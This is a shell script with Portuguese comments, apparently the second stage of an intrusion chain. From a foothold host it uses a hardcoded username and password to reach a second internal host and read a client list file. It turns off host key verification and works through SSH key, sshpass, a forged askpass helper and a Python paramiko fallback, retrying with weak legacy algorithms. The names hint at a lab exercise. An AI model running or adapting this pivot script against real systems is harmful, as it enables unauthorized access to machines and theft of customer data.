#!/bin/sh
# etapa2_ssh_read.sh -- le /home/jon-doe/clientes.txt em 10.0.2.20
# Executa no 10.0.1.10. Tenta chave -> sshpass -> askpass -> paramiko,
# com e sem algoritmos legados (servidores 2017 frequentemente exigem).
set -u
H=${HOST:-10.0.2.20}
U=${SSH_USER:-jon-doe}
P=${SSH_PASS:-Jon1234}
F=${REMOTE:-/home/jon-doe/clientes.txt}

O="-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
 -o ConnectTimeout=10 -o NumberOfPasswordPrompts=1 -o LogLevel=ERROR \
 -o PreferredAuthentications=password,publickey"
L="-o KexAlgorithms=+diffie-hellman-group14-sha1,diffie-hellman-group1-sha1 \
 -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedKeyTypes=+ssh-rsa \
 -o PubkeyAcceptedAlgorithms=+ssh-rsa"

echo "[*] alvo: $U@$H  arquivo: $F"
command -v ssh >/dev/null 2>&1 || echo "[!] cliente ssh ausente no alvo"

ASK=/tmp/.apk.$$
trap 'rm -f "$ASK"' EXIT INT TERM
printf '#!/bin/sh\necho %s\n' "$P" > "$ASK"
chmod 700 "$ASK"

attempt() {   # $1=rotulo  $2=modo  $3=opcoes
  echo "[*] tentativa: $1"
  SA=""
  command -v setsid >/dev/null 2>&1 && SA="setsid -w"
  case "$2" in
    key)
      [ -f "$HOME/.ssh/id_lab" ] || { echo "[-] sem chave"; return 1; }
      timeout 40 ssh -i "$HOME/.ssh/id_lab" -o BatchMode=yes $3 \
        "$U@$H" "cat '$F'" 2>&1 && return 0 ;;
    sshpass)
      command -v sshpass >/dev/null 2>&1 || { echo "[-] sshpass ausente"; return 1; }
      timeout 40 sshpass -p "$P" ssh $3 "$U@$H" "cat '$F'" 2>&1 && return 0 ;;
    askpass)
      SSH_ASKPASS="$ASK" SSH_ASKPASS_REQUIRE=force DISPLAY=:0 \
      timeout 40 $SA ssh $3 "$U@$H" "cat '$F'" </dev/null 2>&1 && return 0 ;;
    paramiko)
      python3 -c 'import paramiko' 2>/dev/null || { echo "[-] paramiko ausente"; return 1; }
      timeout 60 python3 - "$H" "$U" "$P" "$F" <<'PY' 2>&1 && return 0
import sys, paramiko
h, u, p, f = sys.argv[1:5]
c = paramiko.SSHClient()
c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
c.connect(h, username=u, password=p, timeout=10,
          allow_agent=False, look_for_keys=False)
_, o, e = c.exec_command("cat '%s'" % f, timeout=20)
sys.stdout.write(o.read().decode("utf-8", "replace"))
sys.stderr.write(e.read().decode("utf-8", "replace"))
c.close()
PY
      return 1 ;;
  esac
  echo "[-] falhou: $1"
  return 1
}

for OPTS in "$O" "$O $L"; do
  for M in key sshpass askpass paramiko; do
    if attempt "$M" "$M" "$OPTS"; then
      echo "[+] SUCESSO via $M"
      [ -n "$SA" ] && true
      exit 0
    fi
  done
done

echo "[!] nenhum metodo autenticou. Diagnostico do handshake:"
ssh -vv $O "$U@$H" "true" 2>&1 \
  | grep -iE 'debug1: (Connecting|Local version|Remote protocol|Authentications that can continue|Next authentication|Server accepts)|Permission denied|Connection refused|No route|kex_exchange' \
  | head -20
exit 127
